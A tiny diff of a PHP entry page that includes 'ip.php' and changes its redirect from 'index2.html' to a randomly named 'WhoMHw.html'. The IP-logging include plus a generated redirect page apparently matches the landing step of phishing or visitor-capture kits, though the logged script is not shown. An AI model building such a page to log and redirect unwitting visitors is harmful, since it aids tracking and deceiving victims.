@@ -1,5 +1,5 @@
 <?php
 include 'ip.php';
-header('Location: index2.html');
+header('Location: WhoMHw.html');
 exit
 ?>
